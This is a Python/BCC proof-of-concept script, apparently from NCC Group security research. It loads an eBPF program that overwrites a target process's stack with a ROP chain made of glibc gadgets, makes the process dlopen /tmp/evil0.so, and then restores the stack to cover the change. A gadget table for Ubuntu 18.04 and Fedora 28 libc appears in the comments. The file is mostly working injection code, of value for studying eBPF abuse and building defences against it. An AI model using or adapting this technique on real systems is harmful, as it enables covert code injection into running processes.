# Copyright (c) 2018 NCC Group Security Services, Inc. All rights reserved.
# Licensed under Dual BSD/GPLv2 per the repo LICENSE file.

from __future__ import absolute_import, division, print_function, unicode_literals
from bcc import BPF
import argparse
import ctypes
import sys
import time

from base64 import b64decode
from binascii import hexlify

from subprocess import check_output, CalledProcessError
import os
import multiprocessing

stack_ret_addr = int(sys.argv[2], 16)
__libc_start_main = int(sys.argv[3], 16)
__libc_start_main_base = 0x0000000000021ab0



text = """
  // ubuntu 18.04 /lib/x86_64-linux-gnu/libc-2.27.so
  // sha256: cd7c1a035d24122798d97a47a10f6e2b71d58710aecfd392375f1aa9bdde164d

  // fedora 28 /usr/lib64/libc-2.27.so
  // 9cabc2a3508849d991bd2765c4d6626277ee111123847cd263759e453a13848c

  // elf addr | source func                         |  op                     | instr                                                      | fedora?
  // =========================================================================================================================================================
  // 0x0d2975 | mktime@@GLIBC_2.2.5                 | 0f 05 c3                | syscall; ret // raw syscall                                | yes 28 (0x0b5b35)
  // 0x02bf1e | __gconv_get_cache@@GLIBC_PRIVATE    | 5c c3                   | pop rsp ; ret (mid inst, 0x02bf1d) // stack cleanup pt 1   | yes 28 (multiple)
  // 0x0439c8 | mblen@@GLIBC_2.2.5                  | 58 c3                   | pop rax; ret (mid inst, 0x0439c6) // syscall id            | yes 28 (0x039ea8)
  // 0x1977fa | <unlisted>                          | 5f c3                   | pop rdi; ret (mid inst, 0x1977f9) // arg 0                 | yes 28 (0x022adf)
  // 0x08d1af | _IO_file_underflow@@GLIBC_2.2.5     | 5e c3                   | pop rsi; ret (mid inst, 0x08d1ae) // arg 1                 | yes 28 (0x02348e)
  // 0x1415dd | __inet6_scopeid_pton@@GLIBC_PRIVATE | 48 89 c2 c3             | mov rdx, rax; ret // arg 2                                 | yes 28 (0x11707f)
  // 0x155fc6 | clnt_pcreateerror@@GLIBC_2.2.5      | 47 58 b8 01 00 00 00 c3 | pop r8 ; mov eax, 1 ; ret (mid inst, 0x155fc5)             | yes 28 (0x127b36)
  // 0x0a80a3 | __strtok_r_1c@GLIBC_2.2.5           | 4c 89 c1 48 89 0a c3    | mov rcx, r8 ; mov qword ptr [rdx], rcx ; ret // arg 3      | ish 28 (0x03a45d)
  // 0x054a5a | swapcontext@@GLIBC_2.2.5            | 48 89 37 c3             | mov qword ptr [rdi], rsi ; ret // stack cleanup pt 2       | yes 28 (0x048faa)
  // 0x0bcde0 | wcscmp@@GLIBC_2.2.5                 | 48 31 c0 c3             | xor rax, rax; ret; // clear rax                            | yes 28 (0x0a3810)

  // elf addr | func_name
  // ===============
  // 0x04f440 | __libc_system@@GLIBC_PRIVATE
  // 0x166450 | __libc_dlopen_mode@@GLIBC_PRIVATE
  // 0x0e4dd0 | _exit@@GLIBC_2.2.5
  // 0x1108c0 | __close@@GLIBC_2.2.5

  // 0x043999 | 5b c3 | pop rbx; ret
  // 0x0000000000155fc6 : pop r8 ; mov eax, 1 ; ret
  // 0x00000000000a80a3 : mov rcx, r8 ; mov qword ptr [rdx], rcx ; ret
  // 1) set rax (0x0439c8 | 58 c3       | pop rax; ret)
  //    - to safe stack address slot
  // 2) set rdx (0x1415dd | 48 89 c2 c3 | mov rdx, rax; ret)
  //    - to safe stack address slot placed in rax
  // 3) set r8 (0x155fc6 | 47 58 b8 01 00 00 00 c3 | pop r8 ; mov eax, 1 ; ret)
  // 4) set rcx [and rax] (0x155fc6 | 47 58 b8 01 00 00 00 c3 | mov rcx, r8 ; mov qword ptr [rdx], rcx ; ret)

  // to set arg0-3
  //   set rcx via above chain first
  //   set rax to set rdx
  //   set rsi
  //   set rdi
  // call target func
  // cleanup
  //   set rdi to kprobe key
  //   syscall
  //     in kprobe, write back _most_ of original page
  //   pop rsp to pt 2 cleanup
  // pt 2 cleanup
  //   write remaining original parts back
  //   shift stack back to original if need be
  /*
    // after kprobe close
    // cleanup pt 2
    slot -11     : <0x1977fa> // set rdi
    slot -10      : <addr of slot +19>
    slot -9      : <0x08d1af> // set rsi
    slot -8      : <original value of slot +19>
    slot -7      : <0x054a5a> // stack cleanup pt 2 (1/2)
    slot -6      : <0x1977fa> // set rdi
    slot -5      : <addr of slot +20>
    slot -4      : <0x08d1af> // set rsi
    slot -3      : <original value of slot +20>
    slot -2      : <0x054a5a> // stack cleanup pt 2 (2/2)
    slot -1      : <0x0bcde0> // clear rax for "timerfd_settime" return value
    // before kprobe close
    // set arg 3
    slot 0 (ret) : <0x0439c8> // set rax
    slot +1      : <addr of slot +21> // safe addr
    slot +2      : <0x1415dd> // set rdx
    slot +3      : <0x155fc6> // set r8
    slot +4      : <arg 3>
    slot +5      : <0x0a80a3> // set rcx (arg 3)
    // set arg 2
    slot +6      : <0x0439c8> // set rax
    slot +7      : <arg 2>
    slot +8      : <0x1415dd> // set rdx (arg 2)
    // set arg 1
    slot +9      : <0x08d1af> // set rsi (arg 1)
    slot +10     : <arg 1>
    // set arg 0
    slot +11     : <0x1977fa> // set rdi (arg 0)
    slot +12     : <arg 0>
    // call target func
    slot +13     : <func>
    // cleanup
    // kprobe call
    slot +14     : <0x0439c8> // set rax (syscall id for close)
    slot +15     : 0x3 // (syscall id for close)
    slot +16     : <0x1977fa> // set rdi (arg 0)
    slot +17     : 0xffffffffffffff02 (key for kprobe detection)
    slot +18     : <0x0d2975> (syscall)
    // stack cleanup pt 1
    slot +19     : <0x02bf1e> // stack cleanup pt 1
    slot +20     : <addr of slot -10>
    slot +21     : 0x0000000000000000 (safe slot for [set arg 3])
    slot +N      : <string data for arguments if needed>
  */

#include <bcc/proto.h>
#include <linux/socket.h>
#include <linux/uio.h>
#include <linux/skbuff.h>
#include <linux/pid.h>
#include <net/af_unix.h>

#define UINT8_MAX (255)
#define UINT32_MAX (4294967295UL)

typedef struct notify {
  uint8_t data[128];
} notify_t;
BPF_PERF_OUTPUT(output);

inline static void notify(notify_t* n, struct pt_regs* ctx) {
  output.perf_submit(ctx, n, sizeof(notify_t));
}
  /*
  notify_t n;
  #pragma unroll
  for (size_t i = 0; i < sizeof(n.data); i++) {
    n.data[i] = 0;
  }
  notify(&n, ctx);
  */

static const char cmd[] = "touch foo2";

#define libc_gadget(addr)  ((__libc_start_main - __libc_start_main_base) + (size_t)addr)
const size_t slots = 29;

const size_t magic_close_fd = 0xffffffffffffff02; // key for kprobe detection

void __user* const stack_ret_addr = (void*)""" + sys.argv[2] + """;
const size_t __libc_start_main = """ + sys.argv[3] + """;
const size_t __libc_start_main_base = 0x0000000000021ab0;

const size_t cleanup_stack_start = (size_t)stack_ret_addr - sizeof(size_t)*11;

struct stack_holder {
  size_t stack[slots+1];
};

BPF_ARRAY(stack_map, struct stack_holder, 1);

int kretprobe__sys_timerfd_settime(struct pt_regs *ctx) {

  size_t pid_tgid = bpf_get_current_pid_tgid();
  size_t pid = (u32)(pid_tgid >> 32);

  if (pid != """ + sys.argv[1] + """) {
    return 0;
  }

  struct stack_holder* h = NULL;
  int key = 0;
  h = stack_map.lookup(&key);
  if (!h) {
    return 0;
  }

  size_t rop_stack[slots+1];

  //set arg 3
  //rop_stack[0] = 0x4141414141414141;
  rop_stack[0] = libc_gadget(0x0439c8);
  rop_stack[1] = (size_t)stack_ret_addr + sizeof(size_t)*(21);
  rop_stack[2] = libc_gadget(0x1415dd);
  rop_stack[3] = libc_gadget(0x155fc6);
  rop_stack[4] = 0x0; // arg3
  rop_stack[5] = libc_gadget(0x0a80a3);
  //set arg 2
  rop_stack[6] = libc_gadget(0x0439c8);
  rop_stack[7] = 0x0; //arg2
  rop_stack[8] = libc_gadget(0x1415dd);
  //set arg 1
  rop_stack[9] = libc_gadget(0x08d1af);
  rop_stack[10] = (size_t)0x00002; //RTLD_NOW
  //set arg 0
  rop_stack[11] = libc_gadget(0x1977fa);
  rop_stack[12] = (size_t)stack_ret_addr + sizeof(size_t)*(22);
  // call target func
  rop_stack[13] = libc_gadget(0x166450);
  // kprobe call
  rop_stack[14] = libc_gadget(0x0439c8);
  rop_stack[15] = 0x3; // syscall id for close
  rop_stack[16] = libc_gadget(0x1977fa);
  rop_stack[17] = magic_close_fd; // key for kprobe detection
  rop_stack[18] = libc_gadget(0x0d2975); //syscall
  // cleanup pt 1
  rop_stack[19] = libc_gadget(0x02bf1e);

  rop_stack[20] = cleanup_stack_start; // cleanup pt 2 return address
  rop_stack[21] = 0x0000000000000000;
  rop_stack[22] = 0x0;
  rop_stack[23] = 0x0;
  rop_stack[24] = 0x0;
  rop_stack[25] = 0x0;
  rop_stack[26] = 0x0;
  rop_stack[27] = 0x0;
  rop_stack[28] = 0x0;
  rop_stack[29] = 0x4242424242424242;

  char* path = (char*)&rop_stack[22];
  path[0]  = '/';
  path[1]  = 't';
  path[2]  = 'm';
  path[3]  = 'p';
  path[4]  = '/';
  path[5]  = 'e';
  path[6]  = 'v';
  path[7]  = 'i';
  path[8]  = 'l';
  path[9]  = '0';
  path[10]  = '.';
  path[11] = 's';
  path[12] = 'o';
  path[13] = '\\0';

  size_t buf[1];
  bpf_probe_read(&buf[0], sizeof(size_t), stack_ret_addr);

  bpf_trace_printk("ret: 0x%llx\\n", buf[0]);

  bpf_trace_printk("stack_ret_addr: 0x%llx\\n", (size_t)stack_ret_addr);
  size_t rop_end = (size_t)stack_ret_addr + sizeof(size_t)*(slots-1);
  bpf_trace_printk("rop_end: 0x%llx\\n", rop_end);
  bpf_trace_printk("sizeof(rop_stack): 0x%llx\\n", sizeof(rop_stack));

  bpf_probe_read(&h->stack[0], sizeof(struct stack_holder), stack_ret_addr);
  bpf_trace_printk("h->stack[0]: 0x%llx\\n", h->stack[0]);
  bpf_trace_printk("h->stack[29]: 0x%llx\\n", h->stack[29]);

  int r = bpf_probe_write_user(stack_ret_addr, (void*)&rop_stack[0], sizeof(rop_stack));
  bpf_trace_printk("r: %d\\n", r);

  bpf_probe_read(&buf[0], sizeof(size_t), stack_ret_addr);

  bpf_trace_printk("ret: 0x%llx\\n", buf[0]);

  /*
  size_t _exit_addr[1];
  _exit_addr[0] = (__libc_start_main - __libc_start_main_base) + 0x0e4dd0;
  int r = bpf_probe_write_user(stack_ret_addr, (void*)&_exit_addr[0], sizeof(void*));
  */

  return 0;
}

int kprobe__sys_close(
    struct pt_regs *ctx,
    int fd) {

  size_t pid_tgid = bpf_get_current_pid_tgid();
  size_t pid = (u32)(pid_tgid >> 32);

  if (pid != """ + sys.argv[1] + """) {
    return 0;
  }

  if (fd != magic_close_fd) {
    return 0;
  }

  bpf_trace_printk("got magic close\\n");

  struct stack_holder* h = NULL;
  int key = 0;
  h = stack_map.lookup(&key);
  if (!h) {
    return 0;
  }

  {
  size_t mostly_orig_stack[slots+1 + 11];

  mostly_orig_stack[0] = libc_gadget(0x1977fa);
  mostly_orig_stack[1] = (size_t)stack_ret_addr + sizeof(size_t)*(19);
  mostly_orig_stack[2] = libc_gadget(0x08d1af);
  mostly_orig_stack[3] = h->stack[19];
  mostly_orig_stack[4] = libc_gadget(0x054a5a);
  mostly_orig_stack[5] = libc_gadget(0x1977fa);
  mostly_orig_stack[6] = (size_t)stack_ret_addr + sizeof(size_t)*(20);
  mostly_orig_stack[7] = libc_gadget(0x08d1af);
  mostly_orig_stack[8] = h->stack[20];
  mostly_orig_stack[9] = libc_gadget(0x054a5a);
  mostly_orig_stack[10] = libc_gadget(0x0bcde0);

  bpf_probe_read(&mostly_orig_stack[11], sizeof(struct stack_holder), &h->stack[0]);

  // for simplicity, just put back in the last part of the rop chain we still need
  mostly_orig_stack[11+19] = libc_gadget(0x02bf1e);
  mostly_orig_stack[11+20] = cleanup_stack_start; // cleanup pt 2 return address

  size_t cleanup_stack_start = (size_t)stack_ret_addr - sizeof(size_t)*11;

  int r = bpf_probe_write_user((void*)cleanup_stack_start, (void*)&mostly_orig_stack[0], sizeof(mostly_orig_stack));
  }
  size_t cmp_stack[slots+1];
  bpf_probe_read(&cmp_stack[0], sizeof(cmp_stack), stack_ret_addr);

  #pragma unroll
  for (size_t i=0; i<slots+1; i++) {
    if (h->stack[i] == cmp_stack[i]) {
      bpf_trace_printk("slot %u: identical\\n", i);
    } else {
      bpf_trace_printk("slot %u: different\\n", i);
      bpf_trace_printk("  original: 0x%llx\\n", h->stack[i]);
      bpf_trace_printk("            @ 0x%llx\\n", (size_t)stack_ret_addr + sizeof(size_t)*i);
    }
  }
  return 0;
}

"""


class notify_t(ctypes.Structure):
  _fields_ = [
    ("data", ctypes.c_uint8*128),
  ]

def handle_event(cpu, data, size):
  try:
    notify = ctypes.cast(data, ctypes.POINTER(notify_t)).contents
    print(repr(notify))

  except KeyboardInterrupt:
    sys.exit(0)

#b = BPF(text=text).trace_print()
b = BPF(text=text, debug=0x8)
#b = BPF(text=text)

b["output"].open_perf_buffer(handle_event)

b.trace_print()

#print("Listening...")
#while True:
#  try:
#    b.kprobe_poll()
#  except KeyboardInterrupt:
#    sys.exit(0)


